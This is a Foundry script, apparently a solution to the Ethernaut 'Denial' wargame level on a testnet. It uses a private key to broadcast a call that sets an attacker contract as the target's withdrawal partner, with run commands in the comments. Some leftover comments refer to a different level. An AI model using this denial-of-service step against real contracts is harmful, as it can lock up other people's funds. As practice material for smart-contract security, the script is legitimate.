// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// Preservation  contract address: "0xc171bDF00440715CDd46CB505a941e05111E11A0"

interface IDenial {
    function partner() external returns (address);

    function owner() external returns (address);

    function setWithdrawPartner(address) external;

    function withdraw() external;

    function contractBalance() external view returns (uint);
}

contract TriggerAttack is Script {
    IDenial public denial;

    address denialAddr = 0x60A7556cf4CAAC82b7e7F85747C4C75a4ad4a76d;
    address attackAddr = 0x7Ec2250911bAF02Cb8903B4c87fCC25e1dDd8541;

    // address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        // Connect to the target Denial contract
        vm.startBroadcast(privateKey);
        denial = IDenial(denialAddr);
        vm.stopBroadcast();

        // Using the publicly visible function in the Library contract or setFirstTime,

        vm.startBroadcast(privateKey);
        denial.setWithdrawPartner(attackAddr);
        vm.stopBroadcast();
    }
}
// */
// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
// cast storage 0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30 0 --rpc-url $SEPOLIA_RPC_URL

// cast --to-ascii 0x0000000000000000000000002cea95f045f95e8db6185044bb0f06595fcfce13
